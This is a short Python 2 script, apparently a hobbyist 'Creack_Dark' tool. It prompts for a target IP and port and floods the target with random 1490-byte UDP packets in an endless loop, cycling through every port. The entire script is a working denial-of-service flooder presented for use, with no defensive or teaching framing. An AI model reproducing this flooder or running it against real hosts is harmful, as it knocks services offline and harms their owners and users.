import sys

import os

import time

import socket

import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

os.system("clear")

os.system("figlet Creack_Dark")

ip = raw_input("\033[1;32mIP WEP : ")

port = input("\033[1;32mPORT WEP   : ")

sent = 0

while True:

     sock.sendto(bytes, (ip,port))

     sent = sent + 1

     port = port + 1

     print"\033[1;31m"

     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)

     if port == 65534:

       port = 1

